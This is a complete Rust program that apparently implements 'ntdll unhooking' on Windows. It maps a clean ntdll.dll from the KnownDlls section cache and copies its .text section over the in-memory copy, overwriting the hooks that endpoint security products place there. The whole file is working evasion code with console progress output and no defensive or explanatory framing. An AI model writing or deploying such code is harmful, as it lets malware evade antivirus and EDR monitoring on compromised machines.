#![allow(non_snake_case)]
use std::{
    ffi::OsStr,
    mem::zeroed,
    os::{raw::c_void, windows::ffi::OsStrExt},
    ptr::null_mut,
    str::from_utf8,
};

use windows_sys::{
    Wdk::{
        Foundation::OBJECT_ATTRIBUTES,
        System::SystemServices::{PAGE_READONLY, SECTION_MAP_READ},
    },
    Win32::{
        Foundation::{CloseHandle, OBJ_CASE_INSENSITIVE, UNICODE_STRING},
        System::{
            Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, WriteProcessMemory},
            LibraryLoader::GetModuleHandleA,
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
        },
    },
};

unsafe extern "system" {
    fn NtOpenSection(
        SectionHandle: *mut *mut c_void,
        DesiredAccess: u32,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    ) -> i32;
    fn NtMapViewOfSection(
        SectionHandle: *mut c_void,
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        CommitSize: usize,
        SectionOffset: *mut i64,
        ViewSize: *mut usize,
        InheritDisposition: u32,
        AllocationType: u32,
        Win32Protect: u32,
    ) -> i32;
    fn NtUnmapViewOfSection(ProcessHandle: *mut c_void, BaseAddress: *mut c_void) -> i32;
}

pub const fn NT_SUCCESS(nt_status: i32) -> bool {
    nt_status >= 0
}

fn main() {
    unsafe {
        let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);

        if ntdll.is_null() {
            println!("[!] Failed to get ntdll.dll handle");
            return;
        }

        println!("[+] Found ntdll.dll at: {:p}", ntdll);

        let section_name_buffer = OsStr::new(r"\KnownDlls\ntdll.dll")
            .encode_wide()
            .chain(Some(0).into_iter())
            .collect::<Vec<_>>();

        let section_name = UNICODE_STRING {
            Length: ((section_name_buffer.len() - 1) * 2) as u16,
            MaximumLength: ((section_name_buffer.len() + 1) * 2) as u16,
            Buffer: section_name_buffer.as_ptr() as *mut _,
        };

        let mut object_attributes: OBJECT_ATTRIBUTES = zeroed();
        object_attributes.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
        object_attributes.ObjectName = &section_name;
        object_attributes.Attributes = OBJ_CASE_INSENSITIVE;

        let mut section_handle = null_mut();
        let mut view_size = 0;
        let mut base_addr = null_mut();

        let status = NtOpenSection(
            &mut section_handle,
            SECTION_MAP_READ,
            &mut object_attributes,
        );

        if !NT_SUCCESS(status) {
            println!("[!] Failed to open section: 0x{:X}", status);
            return;
        }

        println!(
            "[+] Opened section handle: {:p}",
            section_handle as *mut c_void
        );

        let status = NtMapViewOfSection(
            section_handle,
            -1isize as _,
            &mut base_addr,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_READONLY,
        );

        if !NT_SUCCESS(status) {
            println!("[!] Failed to map view of section: 0x{:X}", status);
            return;
        }

        println!("[+] Mapped view of section at: {:p}", base_addr);

        let dos_header = base_addr as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[!] Invalid DOS signature");
            return;
        }

        let nt_headers = (base_addr as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[!] Invalid NT signature");
            return;
        }

        let first_section = (nt_headers as *const u8).add(size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;

        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
            let section = first_section.add(i as usize);

            let name = from_utf8(&(*section).Name)
                .unwrap()
                .trim_end_matches(char::from(0));

            println!("[+] Section {}: {}", i, name);
            if name.eq_ignore_ascii_case(".text") {
                println!(
                    "[+] Found: {} section at 0x{:X}",
                    name,
                    (*section).VirtualAddress
                );

                let text_sec_addr =
                    (base_addr as *const u8).add((*section).VirtualAddress as usize);
                let text_size = (*section).SizeOfRawData as usize;

                let ntdll_virtual_addr =
                    (ntdll as *const u8).add((*section).VirtualAddress as usize);

                let mut bytes_written: usize = 0;
                if WriteProcessMemory(
                    -1isize as _,
                    ntdll_virtual_addr as _,
                    text_sec_addr as _,
                    text_size,
                    &mut bytes_written,
                ) == 0
                {
                    println!("[-] Failed to replace the .text section");
                }

                break;
            }
        }

        println!("[+] Unhooked ntdll.dll from KnownDlls cache\n");

        NtUnmapViewOfSection(-1isize as _, base_addr as _);
        CloseHandle(section_handle);
    }
}
